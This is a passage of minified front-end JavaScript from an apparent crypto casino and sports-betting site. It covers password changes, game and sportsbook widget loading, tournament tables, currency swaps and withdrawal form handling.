            response: e,
            key: t
        }) => {
            changePassL(e)
        }))
    },
    changePassL = async e => {
        let t = document.getElementById("chPas87563");
        t && (t.disabled = !0);
        let s = document.getElementById("change-pass").value,
            a = document.getElementById("change-repeat").value,
            n = document.getElementById("change-confirm").value,
            r = 1;
        if (s.length < 6 && (r = 0, t && (t.disabled = !1)), a.length < 6 && (r = 0, t && (t.disabled = !1), createNotifyL(1, lp["Min length 6 symbols"], lp.Error)), n.length < 6 && (r = 0, t && (t.disabled = !1), createNotifyL(1, lp["Min length 6 symbols"], lp.Error)), n == s && (r = 0, t && (t.disabled = !1), createNotifyL(1, lp["Min length 6 symbols"], lp.Error)), r) {
            let r = new FormData;
            r.set("action", "profilesavepassw"), r.set("passcurr", s), r.set("passnew", a), r.set("passnewconf", n), r.set("h-recaptcha-response", e), await axios.post("/user/func.php", r).then((e => {
                t && (t.disabled = !1), parseInt(e.data.id[0], 10) ? createNotifyL(1, e.data.m, lp.Error) : (document.getElementById("change-pass").value = "", document.getElementById("change-repeat").value = "", document.getElementById("change-confirm").value = "", createNotifyL(2, e.data.m, lp.Success))
            })).catch((function(e) {
                createNotifyL(1, e.message, lp.Error)
            }))
        }
    }, filterFirstGame = e => Array.isArray(e) ? e.filter((e => -1 != casinoGames.findIndex((t => t[0] == e[0])))) : [], checkModers = e => {
        let t = document.getElementById("pla_mods_ch");
        if (t.value.length < 0) return;
        e.disabled = !0;
        let s = new FormData;
        s.set("action", "checkAgent"), s.set("agent", t.value), axios({
            method: "post",
            url: "/user/func.php",
            data: s,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).then((s => {
            e.disabled = !1, 0 == s.data.error ? Swal.fire({
                title: "",
                html: '<span style="color:#5da000">' + t.value + '</span><span style="color:#fff"> is the official representative of Coins.Game, you can trust this account. Thank you for verification.</span>',
                icon: "success"
            }) : Swal.fire({
                title: "",
                html: '<span style="color:#5da000">' + t.value + '</span><span style="color:#ed6300"> is NOT the official representative of Coins.Game. Do not trust this account. Thank you for verification.</span>',
                icon: "error"
            })
        })).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }))
    };
window.openHome = async () => {
    "Home" != pageNameM && (pageNameM = "Home", setTitlePage(pageNameM), await openPageSite("main"), underClose(5), openHistory("", 2), filterCtGrs())
};
let statusGameOPEN = 0,
    openGame = e => {
        window.scrollTo(0, 0), document.getElementsByClassName("jetgames_wr")[0].classList.add("openGame"), isMobile() || !burgerSt && window.innerWidth > 1024 && window.innerWidth < 1401 && burgerDesc(), 0 == statusGameOPEN ? (openGameNew(e), statusGameOPEN = 1) : closeGame(e)
    },
    betListNN = JSON.stringify(betListCur);
async function openGameNew(e) {
    if (pageNameM = "game", setTitlePage(e), 1 == window.user_il) {
        let e = new FormData;
        e.set("action", "entry");
        let t = await axios({
            method: "post",
            url: "/user/func.php",
            data: e,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }));
        t = t.data, 0 == t.error && (entryOptions = t)
    }
    timeAvatars = Date.now(), window.truncatorJetC123 = window.truncatorJet;
    let t = document.getElementsByClassName("menu-item");
    Array.from(t).forEach((e => {
        e.classList.remove("select"), e.disabled = !1
    }));
    let s = document.getElementsByClassName("ieOgwV");
    Array.from(s).forEach((e => {
        e.style.display = "none"
    })), s = document.getElementsByClassName("game_wrapper")[0], s.classList.remove("sport_wrapper"), s.style.display = "block", document.getElementById("home").classList.remove("back117"), setGameAct(e, "fast2_game_bl", 2), setGameAct(e, "fast_gm765", 1), window.scrollTo(0, 0), chRGames(e + "-v"), s.innerHTML = `<div id="game_core_${e}" data-href='https://jetgamescdn.com/apps/${e}/game'>\n    </div>`;
    let a = document.createElement("script");
    a.src = `https://jetgamescdn.com/apps/${e}/game/game/gameCore.min.js?x=` + cash_, a.defer = 1, document.getElementsByTagName("head")[0].appendChild(a);
    let n = lngGame;
    a.onload = () => {
        let t = document.getElementById(`game_core_${e}`);
        new MutationObserver((function() {
            setTimeout((() => {
                let t = document.getElementsByClassName("jetgames_wr")[0];
                if (t.classList.remove("openGame"), crToursJet("jetgames_wr"), 1 == window.user_il) {
                    t = t.getElementsByClassName("third_block")[0];
                    let s = checkFGs(e + "-v") ? "" : "active";
                    t && (t.innerHTML = `<svg id='heart_game' onclick="chGames('${e+"-v"}',event)" xmlns:xlink="http://www.w3.org/1999/xlink" class="heart_fav ${s}">\n          <use xlink:href="#heart_fav"></use></svg>` + t.innerHTML)
                }
            }), 100)
        })).observe(t, {
            childList: !0
        }), 1 == window.user_il ? (lngGame = entryOptions.lngGame, userAvatarId = entryOptions.userAvatarId, userIDGame = entryOptions.userIDGame, userHASHGame = entryOptions.userHASHGame, userBetCur = entryOptions.userBetCur, userBetCur1 = entryOptions.userBetCur1, amountJetGame = window.truncatorJet(entryOptions.amountJetGame, 8), user_in = window.user_il) : (lngGame = n, userIDGame = "", userHASHGame = "", userBetCur = "USD", userBetCur1 = "$", amountJetGame = "0.00");
        try {
            "blackjack" != e && Object.keys(betListNN).forEach((e => {
                betListNN[e].min && (betListCur[e].min = betListNN[e].min), betListNN[e].max && (betListCur[e].max = betListNN[e].max)
            }))
        } catch (e) {}
        gameName = e, setTransChat(), stChatEx = !1, publicChatGame = "pub_coins", pathImgBack = "url('/apps/chat/coins_black.svg')", "" != userBetCur && (minCur = betListCur[userBetCur] ? betListCur[userBetCur].min : "", maxCur = betListCur[userBetCur] ? betListCur[userBetCur].max : ""), pathBet = `/fast/${e}/bet.php`, pathFunc = `/fast/${e}/func.php`, "/notify_ws/" == urlSocketPath && (urlSocketPath = "/coins_notify_ws/"), createSiteG(), window.openSendBetChat && (window.openSendBetCoins = window.openSendBetChat, setTimeout((() => {
            window.openSendBetChat = window.openSendBetCoins, 1 == stBalUsd && (window.setCount ? setDolGame() : setTimeout((() => {
                setDolGame()
            }), 1e3))
        }), 1e3)), window.truncatorJet && (window.truncatorJet = window.truncatorJetC123), betListCur = Object.entries(betListCur), betListCur.forEach((e => {
            -1 != arrayCurrency.findIndex((t => t[0] == e[0])) && (e[1].precision = 8)
        })), betListCur = Object.fromEntries(betListCur)
    }, openHistory("?game=" + e, 2)
}
betListNN = JSON.parse(betListNN);
let burCoord, setGameAct = (e, t, s) => {
        let a = document.getElementsByClassName(t)[0];
        a.classList.add("open");
        let n = a.getElementsByClassName("active")[0];
        n && n.classList.remove("active"), n && (n.disabled = !1), n = a.getElementsByClassName(e + "_fast" + s)[0], n && n.classList.add("active"), n && (n.disabled = !0)
    },
    stTGJG = 2,
    crToursJet = async (e, t = 1) => {
        let s = document.getElementsByClassName(e)[0],
            a = document.getElementsByClassName("section_tours117")[0],
            n = 0;
        if (1 == t && (stTGJG = 2), a && t == stTGJG) return;
        1 != t && stTGJG != t && (stTGJG = t, n = 1, countBtnTur = 2, countABtnT = 2, pageArTur = [], countTurShow = 15, activeTurBtn = 0, gameTurCo = 0);
        let r = new FormData;
        r.set("action", "getTournamentUserList"), 2 == stTGJG && (t = 1), r.set("id", t);
        let o = await axios({
            method: "post",
            url: "/user/func.php",
            data: r,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).catch((function(e) {
            createNotifyL(1, e.message, lp.Error)
        }));
        o = o.data;
        let i = "";
        pageArTur = o, i = createTurList(0, countTurShow, !1, stTGJG);
        let l = s.getElementsByClassName("tabs_navs")[0],
            c = `<button  onclick="openBlockStat(event,'section_tours117')" class="tabs_nav tsrk87">${lp.Tournaments}</button>`;
        n || l.insertAdjacentHTML("beforeend", c), l = s.getElementsByTagName("main")[0];
        let d = '\n        <div class="pag_control page_con pages-wrap">\n          <button onclick="gameTurAll(0,0)" class="active btn_pag_js4" disabled="">1</button>\n          <button onclick="gameTurAll(1,1)" class="btn_pag_js4">2</button>\n          <button onclick="gameTurAll(2,2)" style="display:none" class="btn_pag_js4">3</button>\n        </div>\n        <div class="pag_control page_con page_pn">\n          <button onclick="gameTurAll(activeTurBtn-1,gameTurCo-1)" disabled="" class="disabled btn_con_js4 previous_btn">\n            <svg id="icon_Arrow" class=" icon_cr icon prev" viewBox="0 0 32 32">\n              <path d="M9.714 27.889a2.023 2.023 0 01-.127-2.814l.127-.132 8.549-8.207c.391-.375.421-.966.09-1.375l-.09-.098-8.549-8.207a2.025 2.025 0 010-2.946 2.238 2.238 0 012.931-.122l.138.122 8.549 8.207c2.054 1.972 2.117 5.133.187 7.177l-.187.188-8.549 8.207a2.234 2.234 0 01-3.069 0z">\n              </path>\n            </svg>\n          </button>\n          <button onclick="gameTurAll(activeTurBtn+1,gameTurCo+1)" class="next-page btn_con_js4">\n            <svg id="icon_Arrow" class="  icon_cr icon next" viewBox="0 0 32 32">\n              <path d="M9.714 27.889a2.023 2.023 0 01-.127-2.814l.127-.132 8.549-8.207c.391-.375.421-.966.09-1.375l-.09-.098-8.549-8.207a2.025 2.025 0 010-2.946 2.238 2.238 0 012.931-.122l.138.122 8.549 8.207c2.054 1.972 2.117 5.133.187 7.177l-.187.188-8.549 8.207a2.234 2.234 0 01-3.069 0z">\n              </path>\n            </svg>\n          </button>\n        </div>';
        if (c = `\n  <div style="display:${n?"block":"none"};" class="history_b section_tours117 s_t117">\n        <div onclick="crToursJet('${e}','2')" class="tours117_tour tours11_2 ${"2"==stTGJG?"active":""}">\n            <img src="/assets/image/tour23.png?x=556" srcset="/assets/image/tour23_2x.png?x=556 2x" alt="Tournament" class="tours117_tI">\n            <div class="tours117_tTAd">\n                <div class="tours117_tTitle">$10K Weekly Tournament</div>\n            <div class="tours117_tAd">\n                <div class="tours117_tAmount">$10 000</div>\n                <div onclick="disBlockEv(event);openTours('candy')" class="tours117_tdet">Details</div>\n            </div>\n            </div>\n        </div>\n        <div onclick="crToursJet('${e}','candy')" class="tours117_tour tours11_candy ${"candy"==stTGJG?"active":""}">\n            <img src="/assets/image/2.png?x=6" srcset="/assets/image/2_2х.png?x=6 2x" alt="Tournament" class="tours117_tI">\n            <div class="tours117_tTAd">\n                <div class="tours117_tTitle">$150 Free Tournament</div>\n            <div class="tours117_tAd">\n                <div class="tours117_tAmount">$150</div>\n                <div onclick="disBlockEv(event);openTours('candy')" class="tours117_tdet">Details</div>\n            </div>\n            </div>\n        </div>\n        <div onclick="crToursJet('${e}','fs')" class="tours117_tour tours11_fs ${"fs"==stTGJG?"active":""}">\n            <img src="/assets/image/tourFS2.png?x=6" srcset="/assets/image/tourFS2x2.png?x=6 2x" alt="Tournament" class="tours117_tI">\n            <div class="tours117_tTAd">\n                <div class="tours117_tTitle"> 500 FS Daily Tournament</div>\n            <div class="tours117_tAd">\n                <div class="tours117_tAmount">500 FS</div>\n                <div onclick="disBlockEv(event);openTours('fs')" class="tours117_tdet">Details</div>\n            </div>\n            </div>\n        </div>\n        <div class="tabs_view" style="transform: none;">\n          <div class=" history_all_in">\n            <div class=" history_all_con">\n              <table class="table_wr5 table_dice table is-hover">\n                <thead>\n                <tr>\n                  <th  class="num">${lp.Place}</th>\n                  <th  class="time">${lp.Nickname}</th>\n                  <th  class="bet">Wager</th>\n                  <th style="text-transform:capitalize"  class="payout">${lp.payout}</th>\n                  </tr>\n                </thead>\n                <tbody class="table_tur_js">\n                ${i}\n                </tbody>\n              </table>\n              <div style="display:none" class=" pag_bl pagination pagination4 ">\n              ${d}\n              </div>\n            </div>\n          </div>\n        </div>\n      </div>`, n || l.insertAdjacentHTML("beforeend", c), n) {
            let e = document.getElementsByClassName("table_tur_js")[0];
            e.innerHTML = i, e = document.getElementsByClassName("pagination4")[0], e.innerHTML = d, e = document.getElementsByClassName("tours117_tour"), Array.from(e).forEach((e => e.classList.remove("active"))), e = document.getElementsByClassName("tours11_" + stTGJG)[0], e.classList.add("active")
        }
        if (countBtnTur = Math.ceil(pageArTur.length / countTurShow), pageArTur.length > countTurShow) {
            document.getElementsByClassName("pagination4")[0].style.display = "flex"
        }
        if (pageArTur.length > 2 * countTurShow) {
            document.getElementsByClassName("btn_pag_js4")[2].style.display = "block", countABtnT = 3
        }
    }, createTurList = (e, t, s = !1, a = !1) => {
        let n = "";
        return pageArTur.slice(e, t).forEach((e => {
            let t = "";
            "fs" == a && (e.win = e.win + " FS");
            let r = "https://jetgamescdn.com/apps/currency/USDT.svg";
            "fs" == a && (r = "/assets/image/tournaments/tur0.png"), s && (t = "itms1 ");
            let o = "USD";
            "candy" == a && (o = "CANDY"), nickUser == e.user && (t += "tur_a"), n += `<tr class="${t}">\n    <td>${e.place}</td>\n    <td>${e.user}</td>\n    <td class="bet">\n    <div class="font_mon cur_coin coin notranslate monospace"><img class="coin-icon" src="https://jetgamescdn.com/apps/currency/${o}.svg">\n    <div class="amount"><span class="amount_str">${Number(e.current.replace(",",".")).toFixed(3)}</span></div>\n    </div>\n    </td>\n    <td class="profitline is_win">\n    <div class="font_mon cur_coin coin notranslate monospace has_sign"><img class="coin-icon" src="${r}">\n    <div class="amount"><span class="amount_str">${e.win}</span></div>\n    </div>\n    </td>\n    </tr>`
        })), n
    }, countBtnTur = 2, countABtnT = 2, pageArTur = [], countTurShow = 15, activeTurBtn = 0, gameTurCo = 0, gameTurAll = (e, t) => {
        if (gameTurCo != t) {
            e > countABtnT - 1 && (e = countABtnT - 1), e > 2 && (e = 2), e < 0 && (e = 0);
            let s = document.getElementsByClassName("btn_pag_js4")[activeTurBtn];
            gameTurCo = t, s.classList.remove("active"), s.disabled = !1, e + 1 > 2 && t + 2 <= countBtnTur || e - 1 < 0 && t - 1 >= 0 ? (s = document.getElementsByClassName("btn_pag_js4")[0], s.innerHTML = t, s.onclick = function() {
                gameTurAll(0, t - 1)
            }, s = document.getElementsByClassName("btn_pag_js4")[1], s.innerHTML = t + 1, activeTurBtn = 1, s.onclick = function() {
                gameTurAll(1, t)
            }, s.classList.add("active"), s.disabled = !0, s = document.getElementsByClassName("btn_pag_js4")[2], s.innerHTML = t + 2, s.onclick = function() {
                gameTurAll(2, t + 1)
            }) : (activeTurBtn = e, s = document.getElementsByClassName("btn_pag_js4")[e], s.classList.add("active"), s.disabled = !0), s = document.getElementsByClassName("btn_con_js4")[0], e - 1 < 0 && t - 1 < 0 ? (s.classList.add("disabled"), s.disabled = !0) : (s.classList.remove("disabled"), s.disabled = !1), s = document.getElementsByClassName("btn_con_js4")[1], e + 1 > countABtnT - 1 && t + 2 > countBtnTur ? (s.classList.add("disabled"), s.disabled = !0) : (s.classList.remove("disabled"), s.disabled = !1)
        }
        let s = document.getElementsByClassName("table_tur_js")[0];
        s.innerHTML = "", s.innerHTML = createTurList(countTurShow * t, countTurShow * (t + 1), !1, stTGJG)
    }, closePopup123 = () => {
        document.getElementById("cok_pop45").style.display = "none", document.cookie = "aCookie=1; max-age=31536000; path=/"
    }, closeWarn123 = () => {
        document.getElementById("cok_pop55").style.display = "none", document.cookie = "aEmail58=1; max-age=31536000; path=/"
    }, openDesc11 = () => {
        openInfo(document.getElementsByClassName("profile__inner")[0])
    }, openInfo = e => {
        let t = document.getElementsByClassName("profile")[0];
        document.getElementsByClassName("profile__dropdown")[0].addEventListener("click", (e => {
            e.preventDefault(), e.stopPropagation()
        })), 1 == e.dataset.open ? (e.dataset.open = "2", t.classList.add("active"), setTimeout((() => {
            window.addEventListener("click", openDesc11)
        }), 0), window.innerWidth <= 550 && (t = document.getElementsByClassName("profile__dropdown")[0], t.addEventListener("click", openDesc11), t = t.getElementsByClassName("itOxHG234")[0], t.addEventListener("click", (e => {
            e.preventDefault(), e.stopPropagation()
        })))) : (e.dataset.open = "1", window.removeEventListener("click", openDesc11), t.classList.remove("active"), window.innerWidth <= 550 && (t = document.getElementsByClassName("profile__dropdown")[0], t.removeEventListener("click", openDesc11)))
    }, underActiveSet = (e = !1) => {
        let t = document.getElementsByClassName("under-mob-block7");
        Array.from(t).forEach((t => {
            t.classList.remove("active"), 5 == e && (t.dataset.op = "0")
        })), 3 == e && t[0].classList.add("active"), 1 == e && t[4].classList.add("active"), 4 == e && t[5].classList.add("active"), 2 == e && t[1].classList.add("active"), 6 == e && t[3].classList.add("active")
    }, underClose = (e, t) => {
        2 == statusNotif && closeNotif(), 2 == statusChatGame && 4 != e && closeChatGame(), burgerSt && 3 != e && burgerDesc(), bonusMobSt && 2 != e && openBonusMob("under_bonuses"), sportMobSt && 1 != e && openBonusMob("under_sports");
        let s = e;
        if (t)
            if (1 == t.dataset.op) s = 5, t.dataset.op = "0";
            else {
                let e = document.getElementsByClassName("under-mob-block7");
                Array.from(e).forEach((e => {
                    e.dataset.op = "0"
                })), t.dataset.op = 1
            } underActiveSet(s)
    }, burCoordB = 0, burgerSt = !1, burgerDesc = () => {
        let e = document.getElementsByClassName("burger_cont")[0];
        if (isMobile()) {
            let e = document.getElementsByClassName("eIVEDH12")[0],
                t = document.getElementsByClassName("main_content_outer")[0];
            "" == e.style.display || "none" == e.style.display ? (burgerSt = !0, burCoord = window.pageYOffset, window.scrollTo(0, 0), errFixCoins(), e.style.display = "block", t.style.display = "block", burCoordB = localStorage.getItem("burgerCoord"), null == burCoordB && (burCoordB = 0), window.scrollTo(0, burCoordB), 2 == statusChatGame && closeChatGame(), 2 == statusNotif && closeNotif()) : (2 == statusChatGame && closeChatGame(), 2 == statusNotif ? closeNotif() : (underActiveSet(5), burgerSt = !1, burCoordB = window.pageYOffset, e.style.display = "none", t.style.display = "none", localStorage.setItem("burgerCoord", burCoordB), errUnFixCoins(), window.scrollTo(0, burCoord)))
        } else {
            let t = document.getElementsByClassName("dJCoDL")[0];
            if (e.classList.contains("large-sidebar")) {
                if (e.classList.add("small-sidebar"), burgerSt = !0, t.classList.add("fold"), e.classList.remove("large-sidebar"), t.classList.remove("unfold"), controlCont(4), "block" == gC("textDropCoins673888")[0].style.display) {
                    let e = {
                        currentTarget: gC("item_burg_sport")[0]
                    };
                    textDropCoins(e)
                }
                if ("0" == gC("textDropCoins672111")[0].dataset.status) {
                    let e = {
                        currentTarget: gC("item_burg_ltour")[0]
                    };
                    textDropCoins(e)
                }
            } else burgerSt = !1, e.classList.add("large-sidebar"), t.classList.add("unfold"), e.classList.remove("small-sidebar"), t.classList.remove("fold"), controlCont(3)
        }
    }, useCont = e => {
        1 == e.dataset.cont ? (controlCont(1), e.dataset.cont = "2") : (controlCont(2), e.dataset.cont = "1")
    }, filterCatSearc4 = e => {
        let t = gC("serch_catsf")[0];
        1 != e ? t.classList.contains("active") ? t.classList.remove("active") : t.classList.add("active") : t.classList.remove("active")
    }, changeHomePage = () => {
        let e = document.getElementsByClassName("main_wrapper")[0];
        gridMain = document.getElementsByClassName("ibRHAt")[0];
        let t = [];
        swSl && t.push(swSl), swSl1 && t.push(swSl1), mySwiperBest && t.push(mySwiperBest), mySwiperLob1 && t.push(mySwiperLob1), mySwiperFor1 && t.push(mySwiperFor1), mySwiperLob2 && t.push(mySwiperLob2), mySwiperRec1 && t.push(mySwiperRec1), mySwiperFeat && t.push(mySwiperFeat), mySwiperCas && t.push(mySwiperCas), mySwiperFeat1 && t.push(mySwiperFeat1), 2 == strM && (e.classList.add("open_chat_wr"), gridMain.classList.add("grid_chatMain"), window.innerWidth < 1451 ? (mySwiperMain && (mySwiperMain.params.slidesPerView = 2 == stlM ? 2 : 3), mySwiperMSL4 && (mySwiperMSL4.params.slidesPerView = 2 == stlM ? 2 : 3), mySwiperMSL2 && (mySwiperMSL2.params.slidesPerView = 2 == stlM ? 2 : 3), t.forEach((e => {
            e.params.slidesPerView = 6, e.params.slidesPerGroup = 4
        })), mySwiperProv && (mySwiperProv.params.slidesPerView = 6)) : (mySwiperMain && (mySwiperMain.params.slidesPerView = 3), mySwiperMSL2 && (mySwiperMSL2.params.slidesPerView = 3), mySwiperMSL4 && (mySwiperMSL4.params.slidesPerView = 3), t.forEach((e => {
            e.params.slidesPerView = 8, e.params.slidesPerGroup = 6
        })), mySwiperProv && (mySwiperProv.params.slidesPerView = 8))), (1 == strM || window.innerWidth > 1850) && (e.classList.remove("open_chat_wr"), gridMain.classList.remove("grid_chatMain"), mySwiperMain && (mySwiperMain.params.slidesPerView = 3), mySwiperMSL2 && (mySwiperMSL2.params.slidesPerView = 3), mySwiperMSL4 && (mySwiperMSL4.params.slidesPerView = 3), window.innerWidth < 1451 ? (t.forEach((e => {
            e.params.slidesPerView = 8, e.params.slidesPerGroup = 6
        })), mySwiperProv && (mySwiperProv.params.slidesPerView = 8)) : (t.forEach((e => {
            e.params.slidesPerView = 9, e.params.slidesPerGroup = 7
        })), mySwiperProv && (mySwiperProv.params.slidesPerView = 9)));
        let s = document.documentElement;
        s.style.setProperty("--prIm", "140.1%"), s.style.setProperty("--prIm", "140%"), mySwiperMain && mySwiperMain.update(), mySwiperMSL2 && mySwiperMSL2.update(), mySwiperMSL4 && mySwiperMSL4.update(), t.forEach((e => e.update())), mySwiperProv && mySwiperProv.update()
    }, sportTG = e => {
        let t = document.getElementsByClassName("btnSport11")[0],
            s = document.getElementsByClassName("btnCasino11")[0];
        1 == e ? (t.classList.remove("active"), s.classList.add("active")) : (t.classList.add("active"), s.classList.remove("active"))
    };
const onTokenExpiredSportNew = () => new Promise(((e, t) => {
    let s = "/sport_/func.php?action=getSportToken&session=" + sesN22;
    2 == sportNewST && (s += "&test=1"), axios.get(s).then((t => {
        e(t.data.token)
    })).catch((function(e) {
        t(e)
    }))
}));
let urSpN22, sesN22, brIdN22, btNewSport = !1,
    sportNewST = 0,
    openSport = (e, t = 0) => {
        if (statusGameOPEN = 1, "sport" == pageNameM && 1 != e && closeGame(), "liveSp" == pageNameM && 3 != e && closeGame(), "sport" == pageNameM && 1 == e) return;
        if ("liveSp" == pageNameM && 3 == e) return;
        setTitlePage("sport"), 1 == e && (pageNameM = "sport"), 3 == e && (pageNameM = "liveSp");
        let s = document.getElementsByClassName("menu-item");
        Array.from(s).forEach((e => {
            e.classList.remove("select"), e.disabled = !1
        })), s = document.getElementsByClassName("item_burg_sport")[0], s.classList.add("select"), s.disabled = !0;
        let a = document.getElementsByClassName("ieOgwV");
        Array.from(a).forEach((e => {
            e.style.display = "none"
        })), a = document.getElementsByClassName("game_wrapper")[0], a.classList.add("sport_wrapper"), a.style.maxWidth = "1328px", a.style.display = "block", a.innerHTML = "", document.getElementById("coins_preloadOpen").style.display = "flex", document.getElementsByClassName("fast2_game_bl")[0].classList.remove("open"), urSpN22 = window.location.search;
        let n = "bbet";
        if (1 == t && (n = "sbet"), 3 == e && openHistory(`${n}/?bt-path=/live`, 2), urSpN22 = -1 != urSpN22.indexOf("bt-path=") ? decodeURIComponent(urSpN22.split("bt-path=")[1].split("&")[0]) : "", 3 != e && -1 == window.location.href.indexOf(`/${n}/`) && openHistory(`${n}/`, 2), 0 == sportNewST) {
            sportNewST = 1, 1 == t && (sportNewST = 2);
            let e = 1 == t ? "https://ui.invisiblesport.com/bt-renderer.min.js?x=" : "https://coins-game.sptpub.com/bt-renderer.min.js?x=";
            brIdN22 = 1 == t ? "2172078609831960576" : "2233305107854925824";
            let s = document.createElement("script");
            s.src = e + cash_, s.defer = 1, document.getElementsByTagName("head")[0].appendChild(s), s.onload = () => {
                getToksSportNew()
            }, s.onerror = () => {
                createNotifyL(1, "Sport doesn't work, sorry", lp.Error)
            }
        } else getToksSportNew()
    },
    getToksSportNew = () => {
        let e, t;
        isMobile() ? (e = 50, t = 0) : (e = 0, t = 85), 2 == statusChatGame && (isMobile() ? (e = 50, t = 400) : (e = 0, t = 400));
        let s = document.getElementById("coins_preloadOpen"),
            a = lngGame;
        "ua" == a && (a = "uk");
        let n = new FormData;
        n.set("action", "getSportToken"), 2 == sportNewST && n.set("test", "1"), axios({
            method: "post",
            url: "/sport_/func.php",
            data: n,
            headers: {
                "Content-Type": "multipart/form-data"
            }
        }).then((function(n) {
            s.style.display = "none", 0 == n.data.error ? (sesN22 = n.data.session, btNewSport = new BTRenderer, btNewSport.initialize({
                brand_id: brIdN22,
                token: n.data.token,
                themeName: "coins-game",
                lang: a,
                target: document.getElementsByClassName("sport_wrapper")[0],
                minFrameHeight: 700,
                betSlipOffsetRight: t,
                betSlipOffsetBottom: e,
                stickyTop: 54,
                betSlipOffsetTop: 54,
                url: urSpN22,
                betslipZIndex: 999,
                onTokenExpired: onTokenExpiredSportNew,
                onRouteChange: function() {
                    document.cookie = `currentUrl=${window.location.href}; max-age=31536000; path=/`;
                    let e, t = document.getElementsByClassName("textDropCoins673888")[0];
                    t = t.getElementsByTagName("a"), Array.from(t).forEach((t => {
                        e = t.getAttribute("href"), e = e.split("bt-path=")[1], e != arguments[0] ? t.classList.remove("active") : t.classList.add("active")
                    }))
                },
                onLogin: function() {
                    openMobileLogin()
                },
                onRegister: function() {
                    openSign()
                },
                onSessionRefresh: function() {
                    btNewSport && btNewSport.kill(), setTimeout((() => {
                        getToksSportNew()
                    }), 0)
                },
                onRecharge: function() {
                    asyFunc(openDeposite, openDepSLot, "deposit")
                }
            })) : createNotifyL(1, "", lp.Error)
        }))
    },
    createNotifyL = (e, t, s, a = !1, n = 5e3) => {
        a || (a = 1 == e ? "/assets/errorN.svg" : "/assets/succN.svg");
        let r = `<div ${""==(t=t||"")?'style="vertical-align: middle;"':""} class='v_tt2'>\n  <img width="35" src="${a}">\n  </div>\n  `,
            o = `\n  <div class='v_t2'>\n  <div>${s}</div>\n  <div>${t}</div>\n  </div>`;
        1 == e ? vNotify.error({
            text: "",
            title: r + o,
            visibleDuration: n
        }) : vNotify.success({
            text: "",
            title: r + o,
            visibleDuration: n
        })
    },
    sendSwap = e => {
        let t = -1;
        e && (e.disabled = !0);
        let s = document.getElementById("swap_amount").value;
        if (swapName || (createNotifyL(1, lp["Choose currency"], lp.Error), t = 1, e && (e.disabled = !1)), Number(s) <= 0 && (createNotifyL(1, lp["Choose change amount"], lp.Error), t = 1, e && (e.disabled = !1)), -1 == t) {
            let t = new FormData;
            t.set("action", "userSwap"), t.set("type", swapName), t.set("count", s), axios({
                method: "post",
                url: " /user/func.php",
                data: t,
                headers: {
                    "Content-Type": "multipart/form-data"
                }
            }).then((async function(t) {
                e && (e.disabled = !1), 0 == t.data.error ? (await getBalanceUser(swapName, 1, 4), getSetSwap(swapName), createNotifyL(2, t.data.message, lp.Success)) : createNotifyL(1, t.data.message, lp.Error)
            })).catch((function(e) {
                createNotifyL(1, e.message, lp.Error)
            }))
        }
    };
async function blogGet(e, t, s, a, n, r, o) {
    pageNameM = "blog", e && e.preventDefault();
    let i = "",
        l = "",
        c = "";
    switch (o) {
        case "category":
            i = t;
            break;
        case "pagination":
            i = t, l = a;
            break;
        case "blog":
            c = s
    }
    let d = new FormData;
    d.set("action", "getDataBlog"), d.set("blog_category", i), d.set("blog_article", c), d.set("blog_page", l), d.set("author", n), d.set("lngGET", blogLng), axios({
        method: "post",
        url: "/site/blog_func.php",
        data: d,
        headers: {
            "Content-Type": "multipart/form-data"
        }
    }).then((function(e) {
        e = e.data, window.scrollTo(0, 0), setTitlePage(e.title);
        let t = document.getElementsByClassName("ieOgwV");
        Array.from(t).forEach((e => {
            e.style.display = "none"
        })), t = document.getElementsByClassName("blogs_wr_t")[0], t.innerHTML = e.data, t = document.getElementsByClassName("blog_wrapper")[0], t.style.display = "block", openHistory(e.url, 2)
    })).catch((function(e) {
        createNotifyL(1, e.message, lp.Error)
    }))
}
let cryptoSetPrc2 = {
        BTC: 7,
        BCH: 6,
        USDT: 4,
        USDC: 4,
        ETH: 7,
        LTC: 6,
        DOGE: 4,
        XRP: 4,
        ADA: 9,
        TRX: 4,
        BNB: 9,
        DOT: 9,
        SOL: 6,
        MATIC: 9,
        SHIB: 8
    },
    setCrypto = () => {
        let e, t = cryptoSetPrc2,
            s = gD("with_imageCur").getAttribute("alt");
        e = s, t = t[e], s = gD("with_amount"), s.value = window.truncatorJet(Number(s.value), t, t), changeWithA(s, t)
    },
    stWidhCr555 = 0,
    sendWithdraw = (e, t) => {
        if (1 == stWidhCr555) return;
        t && (t.disabled = !0), stWidhCr555 = 1;
        let s = -1,
            a = document.getElementById("with_imageCur").getAttribute("alt"),
            n = "",
            r = document.getElementById("with_address"),
            o = "",
            i = !1;
        amount = document.getElementById("with_amount");
        let l = document.getElementsByClassName("dep_list_ns2")[0];
        if (l = l.getElementsByClassName("active")[0], l && chFDV7(l.dataset.cur, 1) == chFDV7(a, 1) && (n = chFDV7(l.innerHTML, 1)), Number(document.getElementById("with_inp_bal").innerHTML) < Number(amount) && (createNotifyL(1, lp["The amount is over your balance"], lp.Error), amount.classList.add("err756"), s = 1), r.value.length < 10 && (r.classList.add("err756"), createNotifyL(1, lp["Enter wallet address"] + ", min 10", lp.Error), s = 1), 0 == amount.value.length && (amount.classList.add("err756"), createNotifyL(1, lp["Enter the debit amount"], lp.Error), s = 1), "XRP" == a ? (i = document.getElementById("with_address_tag"), 0 == i.value.length ? (i.classList.add("err756"), o = r.value) : o = i.value + "|" + r.value) : o = r.value, "USDT" == a && ("TRC20" == n && "0x" == r.value.substr(0, 2) || "ERC20" == n && "0x" != r.value.substr(0, 2)) && (r.classList.add("err756"), createNotifyL(1, "Invalid network", lp.Error), s = 1), -1 == s) {
            r.classList.remove("err756"), amount.classList.remove("err756"), i && i.classList.remove("err756");
            let s = new FormData;
            s.set("network", n), s.set("typepay", a), s.set("address", o), s.set("amount", amount.value), s.set("method", "ccp"), e && s.set("user_code", e), axios({
                method: "post",
                url: "/withdraw/index.php",
                data: s,
                headers: {
                    "Content-Type": "multipart/form-data"
                }
            }).then((function(e) {
                stWidhCr555 = 0, t && (t.disabled = !1), 0 == e.data.error ? (document.getElementById("with_amount").value = "", document.getElementById("with_inp_bal").innerHTML = window.truncatorJet(Number(e.data.amount), 8), upMoneyCoins([
                    [a, e.data.amount]
